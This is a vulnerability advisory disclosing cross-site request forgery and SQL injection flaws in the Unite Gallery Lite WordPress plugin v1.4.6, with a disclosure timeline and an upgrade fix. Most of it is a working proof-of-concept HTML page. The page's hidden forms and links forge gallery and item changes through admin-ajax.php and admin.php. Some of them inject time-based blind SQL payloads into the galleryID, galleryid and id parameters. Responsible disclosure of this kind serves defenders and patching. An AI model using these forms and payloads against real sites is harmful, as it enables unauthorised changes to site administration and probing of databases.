@@ -1,0 +1,335 @@
+# Title: Cross-Site Request Forgery & SQL Injection Vulnerabilities in Unite Gallery Lite Wordpress Plugin v1.4.6
+# Submitter: Nitin Venkatesh
+# Product: Unite Gallery Lite Wordpress Plugin
+# Product URL: https://wordpress.org/plugins/unite-gallery-lite/
+# Vulnerability Type: Cross-site Request Forgery [CWE-352], Improper
+Neutralization of Special Elements used in an SQL Command ('SQL
+Injection')[CWE-89]
+# Affected Versions: v1.4.6 and possibly below.
+# Tested versions: v1.4.6
+# Fixed Version: v1.5
+# Link to code diff: https://plugins.trac.wordpress.org/changeset/1178586/unite-gallery-lite
+# Changelog: https://wordpress.org/plugins/unite-gallery-lite/changelog/
+# CVE Status: New & Unassigned
+
+## Product Information:
+
+The Unite Gallery is all in one image and video gallery for WordPress.
+
+## Vulnerability Description:
+
+The admin forms of the Unite Gallery Lite Wordpress Plugin are susceptible
+to CSRF. Additionally, the following parameters were found to be
+susceptible to SQLi -
+
+Form submitted to /wp-admin/admin-ajax.php:
+- data[galleryID]
+
+Form submitted to /wp-admin/admin.php:
+- galleryid
+- id
+
+## Proof of Concept:
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>CSRF + SQLi in Unite Gallery Lite Wordpress Plugin v1.4.6</title>
+</head>
+<body>
+<h1>CSRF + SQLi in Unite Gallery Lite Wordpress Plugin v1.4.6</h1>
+<p>CSRF - Create Gallery</p>
+<form action="http://localhost/wp-admin//admin-ajax.php" method="post">
+<input type="hidden" name="action" value='unitegallery_ajax_action' />
+<input type="hidden" name="client_action" value='create_gallery' />
+<input type="hidden" name="gallery_type" value='ug-carousel' />
+<input type="hidden" name="data[main][title]" value='test 2' />
+<input type="hidden" name="data[main][alias]" value='test2' />
+<input type="hidden" name="data[main][category]" value='new' />
+<input type="hidden" name="data[main][full_width]" value='true' />
+<input type="hidden" name="data[main][gallery_width]" value='1000' />
+<input type="submit" value="submit" />
+</form>
+
+<p>CSRF + SQLi - Update Gallery</p>
+<form action="http://localhost/wp-admin//admin-ajax.php" method="post">
+<input type="hidden" name="action" value='unitegallery_ajax_action' />
+<input type="hidden" name="client_action" value='update_gallery' />
+<input type="hidden" name="gallery_type" value='ug-carousel' />
+<input type="hidden" name="data[main][title]" value='test 2' />
+<input type="hidden" name="data[main][alias]" value='test2' />
+<input type="hidden" name="data[main][shortcode]" value='[unitegallery
+test2]' />
+<input type="hidden" name="data[main][category]" value='3' />
+<input type="hidden" name="data[main][full_width]" value='true' />
+<input type="hidden" name="data[main][gallery_width]" value='1000' />
+<input type="hidden" name="data[main][gallery_min_width]" value='150' />
+<input type="hidden" name="data[params][tile_width]" value='160' />
+<input type="hidden" name="data[params][tile_height]" value='160' />
+<input type="hidden" name="data[params][theme_gallery_padding]" value='0' />
+<input type="hidden" name="data[params][theme_carousel_align]"
+value='center' />
+<input type="hidden" name="data[params][theme_carousel_offset]" value='0' />
+<input type="hidden" name="data[params][gallery_shuffle]" value='false' />
+<input type="hidden" name="data[params][tile_image_resolution]"
+value='medium' />
+<input type="hidden" name="data[params][carousel_padding]" value='8' />
+<input type="hidden" name="data[params][carousel_space_between_tiles]"
+value='20' />
+<input type="hidden" name="data[params][carousel_scroll_duration]"
+value='500' />
+<input type="hidden" name="data[params][carousel_scroll_easing]"
+value='easeOutCubic' />
+<input type="hidden" name="data[params][carousel_autoplay]" value='true' />
+<input type="hidden" name="data[params][carousel_autoplay_timeout]"
+value='3000' />
+<input type="hidden" name="data[params][carousel_autoplay_direction]"
+value='right' />
+<input type="hidden" name="data[params][carousel_autoplay_pause_onhover]"
+value='true' />
+<input type="hidden" name="data[params][theme_enable_navigation]"
+value='true' />
+<input type="hidden" name="data[params][theme_navigation_enable_play]"
+value='true' />
+<input type="hidden" name="data[params][theme_navigation_align]"
+value='center' />
+<input type="hidden" name="data[params][theme_navigation_offset_hor]"
+value='0' />
+<input type="hidden" name="data[params][theme_navigation_position]"
+value='bottom' />
+<input type="hidden" name="data[params][theme_navigation_margin]"
+value='20' />
+<input type="hidden" name="data[params][theme_space_between_arrows]"
+value='5' />
+<input type="hidden" name="data[params][carousel_navigation_numtiles]"
+value='3' />
+<input type="hidden" name="data[params][position]" value='center' />
+<input type="hidden" name="data[params][margin_top]" value='0' />
+<input type="hidden" name="data[params][margin_bottom]" value='0' />
+<input type="hidden" name="data[params][margin_left]" value='0' />
+<input type="hidden" name="data[params][margin_right]" value='0' />
+<input type="hidden" name="data[params][tile_enable_action]" value='true' />
+<input type="hidden" name="data[params][tile_as_link]" value='false' />
+<input type="hidden" name="data[params][tile_link_newpage]" value='true' />
+<input type="hidden" name="data[params][tile_enable_border]" value='true' />
+<input type="hidden" name="data[params][tile_border_width]" value='3' />
+<input type="hidden" name="data[params][tile_border_color]" value='#f0f0f0'
+/>
+<input type="hidden" name="data[params][tile_border_radius]" value='0' />
+<input type="hidden" name="data[params][tile_enable_outline]" value='true'
+/>
+<input type="hidden" name="data[params][tile_outline_color]"
+value='#8b8b8b' />
+<input type="hidden" name="data[params][tile_enable_shadow]" value='false'
+/>
+<input type="hidden" name="data[params][tile_shadow_h]" value='1' />
+<input type="hidden" name="data[params][tile_shadow_v]" value='1' />
+<input type="hidden" name="data[params][tile_shadow_blur]" value='3' />
+<input type="hidden" name="data[params][tile_shadow_spread]" value='2' />
+<input type="hidden" name="data[params][tile_shadow_color]" value='#8b8b8b'
+/>
+<input type="hidden" name="data[params][tile_enable_image_effect]"
+value='false' />
+<input type="hidden" name="data[params][tile_image_effect_type]" value='bw'
+/>
+<input type="hidden" name="data[params][tile_image_effect_reverse]"
+value='false' />
+<input type="hidden" name="data[params][tile_enable_overlay]" value='true'
+/>
+<input type="hidden" name="data[params][tile_overlay_opacity]" value='0.4'
+/>
+<input type="hidden" name="data[params][tile_overlay_color]"
+value='#000000' />
+<input type="hidden" name="data[params][tile_enable_icons]" value='true' />
+<input type="hidden" name="data[params][tile_show_link_icon]" value='false'
+/>
+<input type="hidden" name="data[params][tile_space_between_icons]"
+value='26' />
+<input type="hidden" name="data[params][tile_enable_textpanel]"
+value='false' />
+<input type="hidden" name="data[params][tile_textpanel_source]"
+value='title' />
+<input type="hidden" name="data[params][tile_textpanel_always_on]"
+value='false' />
+<input type="hidden" name="data[params][tile_textpanel_appear_type]"
+value='slide' />
+<input type="hidden" name="data[params][tile_textpanel_padding_top]"
+value='8' />
+<input type="hidden" name="data[params][tile_textpanel_padding_bottom]"
+value='8' />
+<input type="hidden" name="data[params][tile_textpanel_padding_left]"
+value='11' />
+<input type="hidden" name="data[params][tile_textpanel_padding_right]"
+value='11' />
+<input type="hidden" name="data[params][tile_textpanel_bg_color]"
+value='#000000' />
+<input type="hidden" name="data[params][tile_textpanel_bg_opacity]"
+value='0.6' />
+<input type="hidden" name="data[params][tile_textpanel_title_color]"
+value='#ffffff' />
+<input type="hidden" name="data[params][tile_textpanel_title_text_align]"
+value='left' />
+<input type="hidden" name="data[params][tile_textpanel_title_font_size]"
+value='14' />
+<input type="hidden" name="data[params][tile_textpanel_title_bold]"
+value='true' />
+<input type="hidden" name="data[params][lightbox_type]" value='wide' />
+<input type="hidden" name="data[params][lightbox_hide_arrows_onvideoplay]"
+value='true' />
+<input type="hidden" name="data[params][lightbox_slider_control_zoom]"
+value='true' />
+<input type="hidden" name="data[params][gallery_mousewheel_role]"
+value='zoom' />
+<input type="hidden" name="data[params][lightbox_overlay_opacity]"
+value='1' />
+<input type="hidden" name="data[params][lightbox_overlay_color]"
+value='#000000' />
+<input type="hidden" name="data[params][lightbox_top_panel_opacity]"
+value='0.4' />
+<input type="hidden" name="data[params][lightbox_show_numbers]"
+value='true' />
+<input type="hidden" name="data[params][lightbox_numbers_size]" value='14'
+/>
+<input type="hidden" name="data[params][lightbox_numbers_color]"
+value='#e5e5e5' />
+<input type="hidden" name="data[params][lightbox_show_textpanel]"
+value='true' />
+<input type="hidden" name="data[params][lightbox_textpanel_width]"
+value='550' />
+<input type="hidden" name="data[params][lightbox_textpanel_source]"
+value='title' />
+<input type="hidden" name="data[params][lightbox_textpanel_title_color]"
+value='#e5e5e5' />
+<input type="hidden"
+name="data[params][lightbox_textpanel_title_text_align]" value='left' />
+<input type="hidden"
+name="data[params][lightbox_textpanel_title_font_size]" value='14' />
+<input type="hidden" name="data[params][lightbox_textpanel_title_bold]"
+value='false' />
+<input type="hidden" name="data[params][lightbox_compact_overlay_opacity]"
+value='0.6' />
+<input type="hidden" name="data[params][lightbox_compact_overlay_color]"
+value='#000000' />
+<input type="hidden" name="data[params][lightbox_arrows_position]"
+value='sides' />
+<input type="hidden" name="data[params][lightbox_arrows_inside_alwayson]"
+value='false' />
+<input type="hidden" name="data[params][lightbox_compact_show_numbers]"
+value='true' />
+<input type="hidden" name="data[params][lightbox_compact_numbers_size]"
+value='14' />
+<input type="hidden" name="data[params][lightbox_compact_numbers_color]"
+value='#e5e5e5' />
+<input type="hidden"
+name="data[params][lightbox_compact_numbers_padding_top]" value='7' />
+<input type="hidden"
+name="data[params][lightbox_compact_numbers_padding_right]" value='5' />
+<input type="hidden" name="data[params][lightbox_compact_show_textpanel]"
+value='true' />
+<input type="hidden" name="data[params][lightbox_compact_textpanel_source]"
+value='title' />
+<input type="hidden"
+name="data[params][lightbox_compact_textpanel_title_color]" value='#e5e5e5'
+/>
+<input type="hidden"
+name="data[params][lightbox_compact_textpanel_title_font_size]" value='14'
+/>
+<input type="hidden"
+name="data[params][lightbox_compact_textpanel_title_bold]" value='false' />
+<input type="hidden"
+name="data[params][lightbox_compact_textpanel_padding_top]" value='5' />
+<input type="hidden"
+name="data[params][lightbox_compact_textpanel_padding_left]" value='10' />
+<input type="hidden"
+name="data[params][lightbox_compact_textpanel_padding_right]" value='10' />
+<input type="hidden"
+name="data[params][lightbox_compact_slider_image_border]" value='true' />
+<input type="hidden"
+name="data[params][lightbox_compact_slider_image_border_width]" value='10'
+/>
+<input type="hidden"
+name="data[params][lightbox_compact_slider_image_border_color]"
+value='#ffffff' />
+<input type="hidden"
+name="data[params][lightbox_compact_slider_image_border_radius]" value='0'
+/>
+<input type="hidden"
+name="data[params][lightbox_compact_slider_image_shadow]" value='true' />
+<input type="hidden" name="data[params][include_jquery]" value='true' />
+<input type="hidden" name="data[params][js_to_body]" value='false' />
+<input type="hidden" name="data[params][compress_output]" value='false' />
+<input type="hidden" name="data[params][gallery_debug_errors]"
+value='false' />
+
+<!-- SQLi -->
+<input type="hidden" name="data[galleryID]" value='1 AND (SELECT * FROM
+(SELECT(SLEEP(5)))rock)' />
+<input type="submit" value="submit" />
+</form>
+
+<p>CSRF - Add Items</p>
+<form action="http://localhost/wp-admin/admin-ajax.php" method="post">
+<input type="hidden" name="action" value='unitegallery_ajax_action' />
+<input type="hidden" name="client_action" value='add_item' />
+<input type="hidden" name="gallery_type" value='' />
+<input type="hidden" name="data[type]" value='html5video' />
+<input type="hidden" name="data[title]" value='test' />
+<input type="hidden" name="data[description]" value='' />
+<input type="hidden" name="data[urlImage]" value='' />
+<input type="hidden" name="data[urlThumb]" value='' />
+<input type="hidden" name="data[urlVideo_mp4]" value='
+http://video-js.zencoder.com/oceans-clip.mp4' />
+<input type="hidden" name="data[urlVideo_webm]" value='
+http://video-js.zencoder.com/oceans-clip.webm' />
+<input type="hidden" name="data[urlVideo_ogv]" value='
+http://video-js.zencoder.com/oceans-clip.ogv' />
+<input type="hidden" name="data[catID]" value='4' />
+<input type="submit" value="submit" />
+</form>
+
+<p>CSRF + SQLi - Retrieve Items (Edit Settings - Items Tab)</p>
+<form action="http://localhost/wp-admin/admin-ajax.php" method="post">
+<input type="hidden" name="action" value='unitegallery_ajax_action' />
+<input type="hidden" name="client_action" value='get_cat_items' />
+<input type="hidden" name="gallery_type" value='ug-carousel' />
+<input type="hidden" name="data[catID]" value='3' />
+
+<!-- SQLi -->
+<input type="hidden" name="data[galleryID]" value='1 AND (SELECT * FROM
+(SELECT(SLEEP(5)))rock)' />
+<input type="submit" value="submit" />
+</form>
+
+<p> CSRF + SQLi - Action buttons</p>
+<ul>
+<li>
+<a href="
+http://localhost/wp-admin/admin.php?page=unitegallery&view=items&galleryid=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))rock)
+">
+http://localhost/wp-admin/admin.php?page=unitegallery&view=items&galleryid=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))rock)
+</a></li>
+<li>
+<a href="
+http://localhost/wp-admin/admin.php?page=unitegallery&view=preview&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))rock)
+">
+http://localhost/wp-admin/admin.php?page=unitegallery&view=preview&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))rock)
+</a>
+</li>
+</ul>
+</body>
+</html>
+
+## Solution:
+
+Upgrade to v1.5 or higher
+
+## Disclosure Timeline:
+
+2015-06-06 - Discovered. Reported to developer.
+2015-06-10 - Updated version released.
+2015-07-25 - Publishing disclosure on FD mailing list
+
+## Disclaimer:
+
+This disclosure is purely meant for educational purposes. I will in no way
+be responsible as to how the information in this disclosure is used.
